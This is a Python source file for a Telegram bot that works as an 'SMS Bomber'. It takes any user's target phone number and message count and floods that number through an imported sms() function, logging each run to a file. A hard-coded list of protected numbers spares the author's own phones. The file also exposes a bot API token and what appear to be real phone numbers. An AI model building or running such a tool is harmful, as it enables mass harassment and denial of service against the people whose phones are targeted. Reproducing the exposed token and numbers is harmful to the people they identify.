import telebot
import time
import datetime
tr=datetime.datetime.today()
bot = telebot.TeleBot('5151642864:AAGTdxf5DMfxW4ouwECd6WujfM7UmRW_6RQ')


@bot.message_handler(commands=['help','start'])
def start(message):
    fname=str(message.chat.first_name)
    lname=str(message.chat.last_name)
    help = f'Hi {fname} {lname}.\nWelcome to the bot.\nstart SMS Bomber type /sms .'
    bot.send_message(message.chat.id, help)


number = ''
count=0
protect=['9704715088','+919704715088','8096557085','+918096557085','9640208646','+919640208646']
@bot.message_handler(commands=['sms'])
def bomb(message):
    bot.send_message(message.from_user.id, 'Input target number:')
    bot.register_next_step_handler(message, get_number)


def get_number(message):
    global number
    global protect
    number = message.text
    if message.text in protect:
        bot.send_message(message.from_user.id,"Try again !")
    elif len(message.text) != 10 and message.text != int:

    	bot.send_message(message.from_user.id,"Please enter a valid number")
    else:
        bot.send_message(message.from_user.id, 'Input msg count:')
        bot.register_next_step_handler(message, get_count)


def get_count(message):
    global count
    fname=str(message.chat.first_name)
    lname=str(message.chat.last_name)
    count = message.text
    count_integer = int(count)
    count = count_integer
    from main import sms
    sms(number,count)
    bot.send_message(message.chat.id,f"Bombing Completed on {number}....")
    with open('record.txt','a') as f:
    	f.write(f'\n{fname}{lname}------>Number:{number}count:{count} on {tr}\n')



while True:
	try:
		bot.infinity_polling()
	except Exception:
		time.sleep(1)
